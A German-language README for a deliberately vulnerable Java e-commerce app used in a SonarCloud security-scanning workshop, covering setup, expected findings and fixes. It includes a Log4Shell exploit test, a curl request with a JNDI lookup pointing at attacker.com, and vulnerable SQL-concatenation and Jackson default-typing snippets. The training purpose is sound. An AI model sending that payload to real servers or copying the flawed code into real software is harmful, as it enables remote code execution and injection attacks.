# SonarCloud Workshop - Vulnerable E-Commerce Application

## 🎯 Workshop-Ziel

Dieses Projekt demonstriert **realistische Sicherheitslücken und Code-Quality-Probleme** mit **SonarCloud Team** (14-Tage Trial). Teilnehmer lernen:

1. ✅ Wie SonarCloud **CVEs in Dependencies automatisch** erkennt (Log4Shell!)
2. ✅ Wie man Security Hotspots (SQL Injection, etc.) identifiziert
3. ✅ Wie man Code Smells systematisch behebt
4. ✅ Wie man Quality Gates für CI/CD konfiguriert
5. ✅ Pull Request Decoration & Branch Analysis

## ⭐ Warum SonarCloud Team?

**SonarCloud Team erkennt automatisch:**
- 🔥 CVE-2021-44228 (Log4Shell) in log4j-core 2.14.1
- 🔥 CVE-2019-12384 (Jackson) in jackson-databind 2.9.8
- 🔥 CVE-2016-1000031 in commons-fileupload 1.3.1
- Plus alle Code Quality Issues!

**Free Version kann das NICHT!** Daher nutzen wir die 14-Tage Team Trial.

➡️ **Detailliertes Setup**: Siehe `SONARCLOUD_SETUP.md`

## ⚡ Quick Start (5 Minuten)

```bash
# 1. SonarCloud Account erstellen
https://sonarcloud.io → "Start Free" → Team Trial starten

# 2. Projekt klonen
git clone YOUR_REPO
cd ecommerce-app

# 3. Ersten Scan
mvn clean verify sonar:sonar \
  -Dsonar.projectKey=YOUR_KEY \
  -Dsonar.organization=YOUR_ORG \
  -Dsonar.host.url=https://sonarcloud.io \
  -Dsonar.token=YOUR_TOKEN

# 4. Dashboard ansehen
https://sonarcloud.io/dashboard?id=YOUR_KEY
# → 6 CVEs werden automatisch erkannt! 🔥
```

**Detaillierte Anleitung**: Siehe `SONARCLOUD_SETUP.md`

## ⚠️ WARNUNG

**NIEMALS IN PRODUKTION VERWENDEN!**

Dieses Projekt enthält absichtlich:
- Log4Shell Vulnerability (CVE-2021-44228)
- Jackson Deserialization Attacks
- SQL Injection
- Multiple weitere Sicherheitslücken

## 📋 Voraussetzungen

- Java 11+
- Maven 3.6+
- Docker (für SonarQube)
- IDE (IntelliJ IDEA, Eclipse, VS Code)

## 🚀 Setup für SonarCloud Team (2-Wochen-Trial)

### 1. SonarCloud Account erstellen

```bash
# 1. Gehe zu: https://sonarcloud.io
# 2. Sign up with GitHub/GitLab/Bitbucket/Azure DevOps
# 3. Start Free Trial → Team Plan wählen
# 4. Organisation erstellen
```

### 2. Projekt in SonarCloud einrichten

**Option A - Mit GitHub/GitLab (empfohlen):**
```bash
# 1. Repository auf GitHub/GitLab pushen
git init
git add .
git commit -m "Initial commit - vulnerable code for workshop"
git remote add origin YOUR_REPO_URL
git push -u origin main

# 2. In SonarCloud: "Analyze new project"
# 3. Repository auswählen
# 4. GitHub Actions / GitLab CI wird automatisch konfiguriert
```

**Option B - Manuell (lokal scannen):**
```bash
# 1. In SonarCloud: "Analyze new project" → "Manually"
# 2. Token generieren und kopieren
# 3. Organisation Key kopieren

# 4. Projekt analysieren
mvn clean verify sonar:sonar \
  -Dsonar.projectKey=YOUR_ORG_KEY:ecommerce-vulnerable \
  -Dsonar.organization=YOUR_ORG_KEY \
  -Dsonar.host.url=https://sonarcloud.io \
  -Dsonar.login=YOUR_TOKEN
```

### 3. Ersten Scan durchführen

```bash
# Dependencies installieren
mvn clean install

# SonarCloud Analyse
mvn sonar:sonar \
  -Dsonar.projectKey=YOUR_PROJECT_KEY \
  -Dsonar.organization=YOUR_ORG \
  -Dsonar.host.url=https://sonarcloud.io \
  -Dsonar.token=YOUR_TOKEN

# Nach ~2 Minuten: Dashboard auf sonarcloud.io ansehen
```

### 4. Optional: GitHub Actions für automatische Scans

SonarCloud erstellt automatisch eine `.github/workflows/sonarcloud.yml`:

```yaml
name: SonarCloud Analysis
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  sonarcloud:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up JDK 11
        uses: actions/setup-java@v3
        with:
          java-version: 11
      - name: Cache SonarCloud packages
        uses: actions/cache@v3
        with:
          path: ~/.sonar/cache
          key: ${{ runner.os }}-sonar
      - name: Build and analyze
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
        run: mvn -B verify org.sonarsource.scanner.maven:sonar-maven-plugin:sonar
```

## 📊 Erwartete SonarCloud Team Ergebnisse

### 🎉 SonarCloud Team Features (die Community NICHT hat):

✅ **Dependency Scanning** - Erkennt CVEs automatisch!
✅ **Pull Request Decoration** - Kommentare direkt in PRs
✅ **Branch Analysis** - Mehrere Branches scannen
✅ **Quality Gates** - Customizable Build-Blocker
✅ **Advanced Security** - Mehr Security Rules

### Security
- **Vulnerabilities**: 6-8 (inkl. Dependencies!)
   - CVE-2021-44228 (Log4Shell) ⚠️ CRITICAL
   - CVE-2019-12384 (Jackson) ⚠️ CRITICAL
   - CVE-2016-1000031 (Commons FileUpload) ⚠️ HIGH
- **Security Hotspots**: 8-10 (SQL Injection, Hardcoded Credentials)
- **Security Rating**: E (schlechteste möglich)

### Reliability
- **Bugs**: 15-20 (NPE, Resource Leaks, Empty Catch Blocks)
- **Reliability Rating**: D

### Maintainability
- **Code Smells**: 50-70
- **Technical Debt**: 2-3 Tage
- **Cognitive Complexity**: validateAndProcessUser() = ~20 (Limit: 15)
- **Maintainability Rating**: C-D

### Coverage
- **Code Coverage**: 0% (keine Tests vorhanden)

### Duplications
- **Duplicated Blocks**: 2-3
- **Duplicated Lines**: ~15% (validateUser Methoden)

### 🆕 Was SonarCloud Team ZUSÄTZLICH zeigt:
✅ **Dependency Vulnerabilities** (CVEs in pom.xml)
✅ **License Compliance** (Apache, MIT, etc.)
✅ **Advanced Taint Analysis** (bessere Flow-Analyse)
✅ **Secrets Detection** (API Keys, Passwords)

## 🔍 Die gefährlichsten Probleme

### 🎯 SonarCloud Team wird ALLE diese Probleme zeigen!

### Quick Verification (optional - nur zur Kontrolle)
```bash
# Falls du vorab prüfen willst, was SonarCloud finden wird:
docker run --rm -v $(pwd):/project \
  aquasec/trivy fs --severity CRITICAL,HIGH /project
```

### 1. Log4Shell (CRITICAL) - ⭐ SonarCloud findet dies automatisch!
**Dateien**: `ecommerce.service.UserService.java`, `FileUploadController.java`

```java
// ❌ VULNERABLE
logger.info("User input: " + userInput);

// ✅ FIXED
logger.info("User input: {}", userInput); // Parameterized logging
```

**Exploit Test** (NUR in isolierter Umgebung!):
```bash
curl -X POST http://localhost:8080/user/search \
  -d "email=\${jndi:ldap://attacker.com/Exploit}"
```

### 2. Jackson Deserialization (CRITICAL)
**Datei**: `ecommerce.service.UserService.java` Zeile 131-140

```java
// ❌ VULNERABLE
objectMapper.enableDefaultTyping();
User user = objectMapper.readValue(jsonData, User.class);

// ✅ FIXED
// Kein enableDefaultTyping()
// JSON Schema Validation verwenden
```

### 3. SQL Injection (CRITICAL)
**Datei**: `ecommerce.service.UserService.java` Zeile 36-38

```java
// ❌ VULNERABLE
String query = "SELECT * FROM users WHERE email = '" + email + "'";

// ✅ FIXED
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
```

## 🎓 Workshop-Aufgaben (SonarCloud Team)

### Level 1: SonarCloud Setup (15 Min)
- [ ] SonarCloud Account erstellen (Team Trial)
- [ ] Organisation und Projekt anlegen
- [ ] Ersten Scan durchführen
- [ ] Dashboard erkunden - alle Tabs ansehen!

### Level 2: Dependency Vulnerabilities (30 Min) 🆕
**Das kann nur SonarCloud Team!**
- [ ] Security Tab → Vulnerabilities ansehen
- [ ] Log4Shell (CVE-2021-44228) identifizieren
- [ ] Jackson (CVE-2019-12384) finden
- [ ] Remediation-Hinweise lesen
- [ ] Dependencies in pom.xml updaten
- [ ] Neuer Scan → Vulnerabilities weg! ✅

### Level 3: Security Hotspots (30 Min)
- [ ] SQL Injection mit PreparedStatement fixen
- [ ] Hardcoded Credentials entfernen
- [ ] Empty Catch Blocks behandeln
- [ ] Security Rating verbessern (E → C)

### Level 4: Code Quality (45 Min)
- [ ] Cognitive Complexity reduzieren (validateAndProcessUser)
- [ ] Resource Leaks mit try-with-resources fixen
- [ ] Code Duplication eliminieren
- [ ] Magic Numbers durch Konstanten ersetzen

### Level 5: Quality Gate (30 Min)
- [ ] Custom Quality Gate erstellen
- [ ] Bedingungen setzen (z.B. Coverage > 80%, Security Rating = A)
- [ ] Quality Gate "fail" sehen
- [ ] Tests schreiben bis Gate "passed"

### Level 6: Pull Request Integration (Optional, 30 Min)
- [ ] Neuen Branch erstellen
- [ ] Code-Änderung committen
- [ ] Pull Request erstellen
- [ ] SonarCloud Kommentare im PR sehen
- [ ] Issues fixen → PR approved

### Bonus: Branch Analysis
- [ ] Feature-Branch scannen
- [ ] Unterschiede zu main sehen
- [ ] New Code vs. Overall Code verstehen

## 📚 Lernressourcen

### CVE Details
- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Jackson Databind CVEs](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+CVE)
- [Commons FileUpload CVE-2016-1000031](https://nvd.nist.gov/vuln/detail/CVE-2016-1000031)

### SonarQube
- [SonarQube Rules](https://rules.sonarsource.com/java)
- [Security Rules](https://rules.sonarsource.com/java/type/Security%20Hotspot)

### OWASP
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Dependency Check](https://owasp.org/www-project-dependency-check/)

## 🛠️ Fixes - Cheat Sheet

### Dependencies aktualisieren (pom.xml)

```xml
<!-- ✅ FIXED Versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.20.0</version>
</dependency>

<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.15.2</version>
</dependency>

<dependency>
    <groupId>commons-fileupload</groupId>
    <artifactId>commons-fileupload</artifactId>
    <version>1.5</version>
</dependency>

<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>6.0.11</version>
</dependency>
```

## 🤝 Diskussionspunkte

1. **Warum passiert so etwas?**
   - Technical Debt
   - Zeitdruck
   - Fehlende Awareness
   - Keine automatisierten Checks

2. **Wie verhindert man es?**
   - Dependency Scanning in CI/CD
   - SonarQube Quality Gates
   - Security Training
   - Code Reviews

3. **Real-World Impact**
   - Log4Shell: Milliarden $ Schaden
   - Equifax Breach: Apache Struts
   - Target Breach: Vendor Access

## 📧 Feedback

Fragen oder Verbesserungsvorschläge? Nutzt die Retrospektive am Ende des Workshops!

---

**Happy Scanning! 🔍**